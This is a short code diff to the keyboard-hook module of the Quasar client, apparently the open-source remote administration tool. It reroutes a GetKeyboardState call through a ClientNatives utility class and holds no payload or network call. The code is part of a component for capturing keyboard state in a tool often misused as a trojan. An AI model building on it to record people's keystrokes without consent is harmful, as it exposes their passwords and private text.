@@ -7,6 +7,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.WinApi;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.MouseKeyHook.Implementation
 {
@@ -35,7 +36,7 @@ namespace Quasar.Client.MouseKeyHook.Implementation
         public static KeyboardState GetCurrent()
         {
             var keyboardStateNative = new byte[256];
-            KeyboardNativeMethods.GetKeyboardState(keyboardStateNative);
+            ClientNatives.GetKeyboardState(keyboardStateNative);
             return new KeyboardState(keyboardStateNative);
         }
 
